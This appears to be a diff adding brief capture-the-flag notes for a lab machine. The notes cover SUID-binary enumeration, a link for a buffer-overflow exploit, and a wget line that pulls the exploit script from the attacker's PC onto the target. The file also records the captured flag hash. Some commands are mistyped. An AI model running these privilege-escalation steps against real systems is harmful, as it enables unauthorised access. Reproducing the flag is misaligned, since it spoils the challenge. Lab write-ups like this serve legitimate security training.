@@ -1,0 +1,21 @@
+#10.10.10.111:9999
+-------------------
+# check permissions (SUID)
+find / -perm /4000 2>/dev/null
+#Found file :  /home/ayush/.binary/rop
+
+
+#BOF
+#create script for bof: buf.py     [ watch october video for more help ]
+>>>https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-ii/
+
+#get the file on server using python
+python -m ServerHTTPServer 80      (run this on your pc, where buf.py is saved )
+wget http;//<PC_IP>/buf.py         (run this on server /var/www/html/playsms )
+
+#check buf.py file for more details
+#execute buf.py on server
+ 
+
+#key
+85d3fdf03f969892538ba9a731826222
